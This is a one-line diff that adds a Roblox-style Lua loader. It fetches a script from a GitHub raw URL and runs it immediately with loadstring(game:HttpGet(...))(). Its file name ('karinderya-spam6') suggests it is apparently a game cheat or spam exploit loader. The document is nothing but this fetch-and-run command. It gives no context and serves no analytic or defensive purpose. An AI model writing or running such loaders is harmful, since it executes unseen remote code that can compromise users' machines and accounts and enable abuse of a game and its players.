@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/karinderya-spam6-ye7h5cjtjnsub7.lua"))()
